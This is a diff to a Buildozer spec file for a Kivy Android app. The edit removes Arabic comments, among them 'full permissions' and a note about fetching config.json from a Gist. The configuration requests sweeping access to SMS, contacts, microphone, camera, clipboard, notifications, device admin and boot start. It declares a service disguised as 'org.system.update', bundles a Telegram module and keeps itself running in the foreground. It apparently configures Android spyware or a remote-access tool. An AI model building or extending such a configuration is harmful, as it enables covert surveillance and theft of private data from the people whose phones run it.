@@ -12,10 +12,8 @@ source.dir = .
 source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db
 source.include_patterns = core/*, telegram/*, media/*, config/*, res/*
 
-# المكتبات الأساسية (تم إزالة Pillow, numpy لتقليل الحجم ووقت البناء)
 requirements = python3,kivy,requests,pyjnius,android,urllib3,cryptography,pyopenssl,openssl,chardet,idna,certifi
 
-# الصلاحيات الكاملة
 android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, RECORD_AUDIO, READ_SMS, READ_CONTACTS, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_LOGS, GET_ACCOUNTS, BIND_DEVICE_ADMIN, QUERY_ALL_PACKAGES, NOTIFICATION_LISTENER, READ_CLIPBOARD, WRITE_CLIPBOARD
 
 android.services = org.system.update.AdminReceiver:org.kivy.android.PythonService
@@ -24,19 +22,14 @@ android.manifest = ./android/AndroidManifest.xml
 
 android.foreground = True
 android.whitelist = True
-
-# دعم معمارية ARM64 فقط لتقليل الحجم وتسريع البناء
 android.archs = arm64-v8a
-
 android.release_minify = True
 
-# إصدارات SDK و NDK (يُترك لـ Buildozer التحميل والتثبيت)
 android.api = 33
 android.minapi = 21
 android.ndk = 25b
 android.build_tools_version = 33.0.1
-
-# السماح باتصالات HTTP (ضروري لتحميل config.json من Gist)
+android.sdk_version = 33
 android.uses_cleartext_traffic = True
 
 android.grant_permissions = android.permission.BACKUP, android.permission.READ_FRAME_BUFFER
@@ -51,7 +44,5 @@ resizeable = 0
 
 kivy_deps = sdl2, glew, vulkan
 cythonize = True
-
 android.add_deps = ./media,./core,./telegram,./config
-
 android.exclude_libs = armeabi-v7a/libcrypto.so, armeabi-v7a/libssl.so
